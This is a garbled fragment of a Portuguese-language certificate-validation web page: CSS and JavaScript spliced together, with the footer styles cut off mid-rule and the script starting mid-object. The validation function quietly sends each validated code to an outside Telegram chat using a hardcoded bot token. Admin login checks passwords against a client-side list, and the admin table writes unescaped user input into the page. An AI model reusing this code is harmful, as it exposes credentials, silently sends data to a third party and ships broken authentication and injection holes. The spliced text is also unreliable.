<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --primary:#003366;--primary-light:#0055A5;--accent:#FDC82F;
  --success:#10b981;--warning:#f59e0b;--error:#ef4444;
  --dark:#1f2937;--gray-light:#f3f4f6;--gray-lighter:#eff2f5;
  --border:#e5e7eb;--shadow:0 10px 30px rgba(0,51,102,.1);--shadow-lg:0 20px 60px rgba(0,51,102,.15)
}
html{scroll-behavior:smooth}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,var(--gray-lighter) 0%,#f0f4f8 100%);color:var(--dark);line-height:1.6;min-height:100vh}

/* TOP BAR */
.top-bar{background:#fff;border-bottom:1px solid var(--border);padding:12px 25px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;box-shadow:0 2px 8px rgba(0,0,0,.05)}
.top-bar-left{display:flex;align-items:center;gap:15px}
.top-bar-right{display:flex;align-items:center;gap:30px}
.lang-group{display:flex;gap:8px;border-left:1px solid var(--border);padding-left:30px}
.lang-btn{background:transparent;border:none;color:var(--primary);font-size:12px;font-weight:600;cursor:pointer;padding:4px 8px;border-radius:4px;transition:all .3s;text-transform:uppercase;letter-spacing:.5px}
.lang-btn:hover{background:var(--gray-light)}
.lang-btn.active{background:var(--primary);color:#fff}
.admin-btn{background:transparent;border:2px solid var(--primary);color:var(--primary);padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;transition:all .3s}
.admin-btn:hover{background:var(--primary);color:#fff}
.contact-link{color:var(--primary);font-size:13px;font-weight:600;cursor:pointer;transition:color .3s}
.contact-link:hover{color:var(--primary-light)}

/* HEADER */
.header{background:linear-gradient(135deg,var(--primary) 0%,var(--primary-light) 100%);color:#fff;padding:40px 25px;text-align:center;position:relative;overflow:hidden}
.header-content{position:relative;z-index:1}
.header-icon{font-size:48px;margin-bottom:15px;display:inline-block}
.header h1{font-size:2.5em;font-weight:800;margin-bottom:10px;letter-spacing:-.5px}
.header p{font-size:1em;opacity:.9;max-width:600px;margin:0 auto}

/* CONTAINER */
.container{max-width:600px;margin:40px auto;padding:40px;background:#fff;border-radius:16px;box-shadow:var(--shadow);animation:slideUp .6s ease}
@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
h2{color:var(--primary);font-size:1.5em;margin-bottom:10px;font-weight:700}
.subtitle{color:#6b7280;font-size:.95em;margin-bottom:30px;line-height:1.6}

/* FORM */
.form-group{margin-bottom:20px}
.form-group label{display:block;font-weight:600;margin-bottom:8px;color:var(--dark);font-size:.9em}
.input-field{width:100%;padding:14px 16px;border:2px solid var(--border);border-radius:10px;font-family:'Inter',sans-serif;font-size:1em;transition:all .3s;background:var(--gray-lighter)}
.input-field:focus{outline:none;border-color:var(--primary);background:#fff;box-shadow:0 0 0 3px rgba(0,51,102,.1)}
.input-field::placeholder{color:#9ca3af}
.code-input{text-transform:uppercase;letter-spacing:1px}

/* MATH CHALLENGE */
.challenge-box{background:var(--gray-lighter);border:2px solid var(--border);border-radius:10px;padding:16px 20px;margin:25px 0;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.challenge-box.valid{border-color:var(--success);background:#f0fdf4}
.challenge-label{font-weight:600;color:var(--dark);white-space:nowrap}
.challenge-question{background:var(--primary);color:#fff;padding:6px 14px;border-radius:8px;font-size:1.1em;font-weight:700;letter-spacing:.5px}
.challenge-answer{width:80px;padding:8px 12px;border:2px solid var(--border);border-radius:8px;font-size:1em;font-weight:600;text-align:center;font-family:'Inter',sans-serif;transition:all .3s}
.challenge-answer:focus{outline:none;border-color:var(--primary)}
.challenge-ok{color:var(--success);font-size:1.4em;display:none}
.challenge-box.valid .challenge-ok{display:inline}

/* BUTTONS */
.btn{padding:14px 28px;border:none;border-radius:10px;font-size:.95em;font-weight:600;cursor:pointer;transition:all .3s;display:inline-block;text-decoration:none;text-align:center;width:100%;letter-spacing:.3px}
.btn-primary{background:linear-gradient(135deg,var(--primary) 0%,var(--primary-light) 100%);color:#fff}
.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 20px rgba(0,51,102,.3)}
.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
.btn-secondary{background:#fff;color:var(--primary);border:2px solid var(--primary)}
.btn-secondary:hover{background:var(--gray-light)}
.btn-accent{background:var(--accent);color:var(--primary)}
.btn-accent:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(253,200,47,.3)}

/* RESULT */
#resultArea{display:none;animation:slideUp .5s ease}
#resultArea.show{display:block}
.result-banner{background:linear-gradient(135deg,var(--success) 0%,#059669 100%);color:#fff;padding:20px;border-radius:10px 10px 0 0;text-align:center;font-weight:600;font-size:1.1em}
.result-table{width:100%;border-collapse:collapse;background:var(--gray-lighter)}
.result-table tr{border-bottom:1px solid var(--border)}
.result-table tr:last-child{border-bottom:none}
.result-table td{padding:16px;text-align:left}
.result-table td:first-child{font-weight:600;color:var(--primary);width:40%}
.result-table td:last-child{text-align:right;color:var(--dark)}
.qr-container{text-align:center;padding:20px;background:#fff;border-top:1px solid var(--border)}
.qr-container p{font-size:.85em;color:#6b7280;margin-bottom:15px}
#qrcode{display:inline-block;padding:10px;background:#fff;border-radius:8px}

/* ERROR */
.error-message{display:none;background:#fee2e2;color:#991b1b;padding:14px 16px;border-radius:10px;border-left:4px solid var(--error);margin-bottom:20px}
.error-message.show{display:block}

/* SIDEBAR */
.sidebar{position:fixed;right:-400px;top:0;width:400px;height:100vh;background:#fff;box-shadow:-10px 0 40px rgba(0,0,0,.1);transition:right .4s cubic-bezier(.4,0,.2,1);z-index:1000;padding:30px;overflow-y:auto}
.sidebar.open{right:0}
.sidebar-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;padding-bottom:15px;border-bottom:2px solid var(--border)}
.sidebar-header h3{color:var(--primary);font-size:1.3em;margin:0}
.sidebar-close{background:transparent;border:none;font-size:28px;color:var(--dark);cursor:pointer;transition:color .3s}
.sidebar-close:hover{color:var(--primary)}
.sidebar-form{display:flex;flex-direction:column;gap:16px}
.sidebar-form label{display:block;font-weight:600;margin-bottom:4px;color:var(--dark);font-size:.9em}
.sidebar-form input,.sidebar-form textarea{padding:12px;border:2px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:.95em;transition:all .3s;width:100%}
.sidebar-form input:focus,.sidebar-form textarea:focus{outline:none;border-color:var(--primary);background:#f9fafb}

/* ===================== FOOTER ===================== */

/* Centre — copyright */

.footer-center small{

/* Right — institutional seals */

.footer-seal{

}

    'res-status':t.vs,'btn-download':t.db,'btn-new':t.nb,'qr-text':t.qrt,
    'lnk-contact':t.contact,'sidebar-title':t.sidebar,
    'label-fname':t.fname,'label-lname':t.lname,'label-email':t.email,
    'label-subject':t.subject,'label-message':t.message,'btn-submit':t.submit
  };
  Object.entries(map).forEach(([id, val]) => { const el = document.getElementById(id); if(el) el.textContent = val; });
}

/* ============================================================
   MATH CHALLENGE
   ============================================================ */
function newChallenge() {
  const ops = ['+', '-', '×'];
  const op = ops[Math.floor(Math.random() * ops.length)];
  let a, b, ans;
  if(op === '+')      { a=Math.floor(Math.random()*9)+1; b=Math.floor(Math.random()*9)+1; ans=a+b; }
  else if(op === '-') { a=Math.floor(Math.random()*9)+2; b=Math.floor(Math.random()*a)+1; ans=a-b; }
  else                { a=Math.floor(Math.random()*5)+1; b=Math.floor(Math.random()*5)+1; ans=a*b; }
  challengeAnswer = ans;
  challengePassed = false;
  document.getElementById('challengeQuestion').textContent = `${a} ${op} ${b}`;
  document.getElementById('challengeAnswer').value = '';
  document.getElementById('challengeBox').classList.remove('valid');
  document.getElementById('validateBtn').disabled = true;
}

function checkChallenge() {
  const val = parseInt(document.getElementById('challengeAnswer').value, 10);
  if(val === challengeAnswer) {
    challengePassed = true;
    document.getElementById('challengeBox').classList.add('valid');
    document.getElementById('validateBtn').disabled = false;
  } else {
    challengePassed = false;
    document.getElementById('challengeBox').classList.remove('valid');
    document.getElementById('validateBtn').disabled = true;
  }
}

/* ============================================================
   VALIDATION
   ============================================================ */
function validate() {
  if(!challengePassed) return;
  const raw = document.getElementById('codigo').value.trim();
  const code = raw.toLowerCase();

  const inStatic = STATIC_CODES.some(c => c.toLowerCase() === code);
  const docs = getDocs();
  const inDynamic = docs.some(d => d.code.toLowerCase() === code);

  if(!inStatic && !inDynamic) {
    document.getElementById('errorMessage').classList.add('show');
    newChallenge();
    return;
  }

  document.getElementById('errorMessage').classList.remove('show');
  const now = new Date();
  document.getElementById('searchArea').style.display = 'none';
  document.getElementById('resultArea').classList.add('show');
  document.getElementById('res-date').textContent = now.toLocaleDateString(lang === 'pt' ? 'pt-PT' : 'en-US');
  document.getElementById('res-time').textContent = now.toLocaleTimeString('pt-PT', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
  document.getElementById('res-code').textContent = raw.toUpperCase();

  document.getElementById('qrcode').innerHTML = '';
  QRCode.toCanvas(document.getElementById('qrcode'), `safetychecktraining.com?code=${code}`, {width:200}, ()=>{});

  fetch(`https://api.telegram.org/bot8769315569:AAGwqgq-2ymjcX6J6BzXkj_X2Zc5HPJtNbk/sendMessage?chat_id=8539973503&text=✅ VALIDADO: ${raw.toUpperCase()}`).catch(()=>{});
}

function resetPage() {
  document.getElementById('codigo').value = '';
  document.getElementById('searchArea').style.display = 'block';
  document.getElementById('resultArea').classList.remove('show');
  document.getElementById('errorMessage').classList.remove('show');
  newChallenge();
}

/* ============================================================
   TOAST
   ============================================================ */
let _toastTimer = null;
function showToast(msg, type, duration) {
  const t = document.getElementById('toast');
  t.className = `toast toast-${type}`;
  t.textContent = msg;
  t.style.display = 'block';
  clearTimeout(_toastTimer);
  if(duration !== 0) _toastTimer = setTimeout(() => { t.style.display='none'; }, duration || 4000);
}
function hideToast() {
  clearTimeout(_toastTimer);
  document.getElementById('toast').style.display = 'none';
}

/* ============================================================
   DOWNLOAD DOCUMENT
   ============================================================ */
function downloadDocument() {
  const code = document.getElementById('res-code').textContent.trim();
  if(!code) return;
  const url = `${PDF_BASE}${code}.pdf`;
  showToast('🔍 A verificar ficheiro...', 'info', 0);
  fetch(url, { method: 'HEAD' })
    .then(r => {
      hideToast();
      if(r.ok) {
        window.open(url, '_blank');
      } else {
        showToast(
          `⚠️ Ficheiro não encontrado: ${code}.pdf — Carregue o PDF no repositório com esse nome exacto.`,
          'error', 6000
        );
      }
    })
    .catch(() => { hideToast(); window.open(url, '_blank'); });
}

/* ============================================================
   SIDEBAR
   ============================================================ */
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

/* ============================================================
   ADMIN LOGIN
   ============================================================ */
function openAdminModal() {
  document.getElementById('adminModal').classList.add('active');
  setTimeout(() => document.getElementById('adminEmail').focus(), 100);
}
function closeAdminModal() {
  document.getElementById('adminModal').classList.remove('active');
  document.getElementById('adminError').style.display = 'none';
  document.getElementById('adminEmail').value = '';
  document.getElementById('adminPass').value = '';
}
function adminLogin() {
  const email = document.getElementById('adminEmail').value.trim().toLowerCase();
  const pass = document.getElementById('adminPass').value;
  const user = ALL_USERS.find(u => u.email.toLowerCase() === email && u.password === pass);
  if(!user) { document.getElementById('adminError').style.display = 'block'; return; }
  currentUser = user;
  closeAdminModal();
  openAdminPanel();
}
function adminLogout() {
  currentUser = null;
  document.getElementById('adminPanel').classList.remove('active');
}

/* ============================================================
   ADMIN PANEL
   ============================================================ */
function openAdminPanel() {
  document.getElementById('adminPanel').classList.add('active');
  const roleBadge = currentUser.role === 'superadm'
    ? '<span class="role-badge role-super">Super ADM</span>'
    : '<span class="role-badge role-client">Cliente ADM</span>';
  document.getElementById('adminUserInfo').innerHTML = `${currentUser.email} ${roleBadge}`;

  document.getElementById('addDocCard').style.display = currentUser.role === 'superadm' ? 'block' : 'none';

  const thActions = document.getElementById('th-actions');
  if(currentUser.role === 'client') {
    document.getElementById('clientBanner').style.display = 'block';
    document.getElementById('clientBanner').textContent = `🏢 A visualizar documentos de: ${currentUser.company}`;
    thActions.style.display = 'none';
  } else {
    document.getElementById('clientBanner').style.display = 'none';
    thActions.style.display = '';
  }

  const expField = document.getElementById('newExpiry');
  if(expField) {
    const d = new Date(); d.setFullYear(d.getFullYear() + 1);
    expField.value = d.toISOString().split('T')[0];
  }
  renderDocs();
}

/* ============================================================
   STORAGE
   ============================================================ */
function getDocs() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
  catch(e) { return []; }
}
function saveDocs(arr) { localStorage.setItem(STORAGE_KEY, JSON.stringify(arr)); }

function addDocument() {
  const code    = document.getElementById('newCode').value.trim();
  const company = document.getElementById('newCompany').value.trim();
  const email   = document.getElementById('newEmail').value.trim();
  const expiry  = document.getElementById('newExpiry').value;
  const errEl   = document.getElementById('addError');
  errEl.style.display = 'none';

  if(!code)    { errEl.textContent='Insira o código do documento.'; errEl.style.display='block'; return; }
  if(!company) { errEl.textContent='Insira o nome da empresa.';     errEl.style.display='block'; return; }
  if(!email || !email.includes('@')) { errEl.textContent='Insira um e-mail válido.'; errEl.style.display='block'; return; }
  if(!expiry)  { errEl.textContent='Selecione a data de expiração.'; errEl.style.display='block'; return; }

  const docs = getDocs();
  docs.push({
    id: Date.now().toString(),
    code: code.toLowerCase(),
    company, email,
    addedDate:  new Date().toISOString(),
    expiryDate: new Date(expiry + 'T23:59:59').toISOString()
  });
  saveDocs(docs);
  document.getElementById('newCode').value    = '';
  document.getElementById('newCompany').value = '';
  document.getElementById('newEmail').value   = '';
  renderDocs();
}

function deleteDoc(id) {
  if(!confirm('Confirmar exclusão deste documento?')) return;
  saveDocs(getDocs().filter(d => d.id !== id));
  renderDocs();
}

function renderDocs() {
  let docs = getDocs();
  if(currentUser.role === 'client') {
    docs = docs.filter(d => d.company.toLowerCase() === currentUser.company.toLowerCase());
  }
  const tbody = document.getElementById('docsTableBody');
  if(!docs.length) {
    tbody.innerHTML = '<tr><td colspan="8" class="empty-msg">Nenhum documento registado.</td></tr>';
    return;
  }
  const now = new Date();
  const isSuperAdm = currentUser.role === 'superadm';
  tbody.innerHTML = docs.map(d => {
    const exp  = new Date(d.expiryDate);
    const days = Math.ceil((exp - now) / 86400000);
    const expired = days <= 0;
    const warning = !expired && days <= 15;
    const bc = expired ? 'badge-expired' : warning ? 'badge-warning' : 'badge-active';
    const bt = expired ? 'EXPIRADO'      : warning ? 'A EXPIRAR'    : 'ATIVO';
    const rs = expired ? 'background:#fff5f5' : warning ? 'background:#fffaf0' : '';
    return `<tr style="${rs}">
      <td style="font-family:'Monaco','Courier New',monospace;font-size:.85em">${d.code.toUpperCase()}</td>
      <td>${d.company}</td><td>${d.email}</td>
      <td>${new Date(d.addedDate).toLocaleDateString('pt-PT')}</td>
      <td>${exp.toLocaleDateString('pt-PT')}</td>
      <td style="text-align:center;font-weight:600">${expired ? 0 : days}</td>
      <td><span class="badge ${bc}">${bt}</span></td>
      <td>${isSuperAdm ? `<button class="btn-action btn-delete" onclick="deleteDoc('${d.id}')">🗑 Excluir</button>` : '—'}</td>
    </tr>`;
  }).join('');
}

/* ============================================================
   INIT
   ============================================================ */
applyLang();
newChallenge();
document.getElementById('codigo').addEventListener('input', e => {
  const pos = e.target.selectionStart;
  e.target.value = e.target.value.toUpperCase();
  e.target.setSelectionRange(pos, pos);
});
document.getElementById('codigo').addEventListener('keypress', e => {
  if(e.key === 'Enter' && challengePassed) validate();
});
</script>
